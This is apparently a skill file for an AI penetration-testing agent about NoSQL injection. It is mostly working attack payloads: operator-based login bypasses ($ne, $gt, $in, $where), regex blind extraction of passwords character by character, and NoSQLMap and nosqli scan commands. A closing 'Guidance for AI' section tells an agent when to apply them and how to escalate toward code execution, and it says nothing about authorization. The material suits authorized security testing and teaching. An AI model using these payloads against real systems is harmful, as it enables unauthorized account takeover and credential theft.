# NoSQL Injection Skill

## Goal

Identify and exploit NoSQL injection vulnerabilities in applications using databases like MongoDB, CouchDB, or other NoSQL data stores.

## Methodology

1. **Identify Injection Points:** Find parameters that interact with NoSQL databases (login forms, search fields, API endpoints)
2. **Test Operator Injection:** Inject NoSQL operators (`$ne`, `$gt`, `$regex`, `$where`) via URL or JSON
3. **Bypass Authentication:** Use operators like `{$ne: null}` or `{$gt: ""}` to bypass login forms
4. **Extract Data:** Use regex-based blind injection to extract field values character by character
5. **Test for Code Execution:** Attempt `$where` clause injection for JavaScript execution

## Common Operators

```bash
# URL-based injection
username[$ne]=admin&password[$ne]=password
username[$regex]=^a.*&password[$ne]=1
username[$exists]=true&password[$exists]=true

# JSON-based injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

## Authentication Bypass Payloads

```json
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
```

## Blind Data Extraction

```bash
# Extract password length
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{5}

# Extract password character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
```

## Tools

* **NoSQLMap** - Automated NoSQL injection scanner
* **Burp Suite** - Intercept and modify requests
* **nosqli** - CLI tool for NoSQL injection testing

## Example Commands

```bash
# Using NoSQLMap
python nosqlmap.py -u http://target/login -p username,password

# Using nosqli
nosqli scan -t http://target/api/users?id=1
```

## Guidance for AI

* Activate when testing login forms or APIs connected to MongoDB/NoSQL databases
* Start with basic operator injection (`$ne`, `$gt`) before trying regex extraction
* For blind injection, use time-based or response-based inference
* Check for `$where` clause injection for potential code execution
* Test both URL-encoded and JSON payload formats
* Always sanitize user inputs - recommend using allowlists for operators
